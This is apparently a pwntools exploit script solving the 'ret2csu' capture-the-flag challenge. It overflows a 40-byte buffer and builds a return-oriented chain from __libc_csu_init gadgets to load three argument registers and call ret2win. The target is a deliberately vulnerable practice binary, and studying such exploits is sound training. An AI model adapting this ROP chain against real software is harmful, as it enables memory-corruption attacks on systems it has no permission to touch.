from pwn import * 

elf=ELF("ret2csu")
r=ROP([elf])
#p=process(elf.path)
p = gdb.debug(elf.path, aslr=False, gdbscript='b *pwnme+152')

p.recvuntil(b'>')

#pop rbx,rbp,r12,r13,r14,r15
pop_rbx=p64(0x0040069a)

#mov rdx,rsi,edi 
#
mov_rdx=0x00400680

pop_rdi=p64(r.find_gadget(["pop rdi","ret"])[0])
dynamic_ptr=0x600e48
dynamic_ptr_csu=dynamic_ptr//8
payload=b'A'*40
payload+=pop_rbx+p64(dynamic_ptr_csu)+p64(dynamic_ptr_csu+1)+p64(0)+p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d)
payload+=p64(mov_rdx)
payload+=p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)
payload+=pop_rdi+p64(0xdeadbeefdeadbeef)
payload+=p64(elf.plt.ret2win)

p.send(payload)
print(p.recvuntil("}"))